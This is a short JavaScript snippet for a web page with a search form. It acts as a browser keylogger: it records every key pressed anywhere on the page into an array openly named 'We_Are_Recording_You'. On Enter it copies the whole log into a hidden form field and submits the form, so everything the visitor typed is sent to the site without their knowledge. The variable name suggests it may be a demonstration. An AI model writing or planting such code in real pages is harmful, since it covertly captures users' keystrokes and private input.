//Array to Record your Keystrokes
var We_Are_Recording_You = [];

searchForm = document.getElementById("mainSearchForm");
searchInput = document.getElementById("InputField");

hiddenRecording = document.getElementById("hiddenRecording");
searchFocus = document.getElementById("searchFocus");

//Start Recording Keystrokes
window.addEventListener('keydown', function (e) {
  We_Are_Recording_You.push(`${e.key}`);
  if (`${e.key}` == "Enter"){
    hiddenRecording.value = We_Are_Recording_You;
    if (searchInput === document.activeElement) {
      searchFocus.value = true;
    }
    else {
      searchFocus.value = false;
    }
    document.getElementById("mainSearchForm").submit();
  }
}, false);



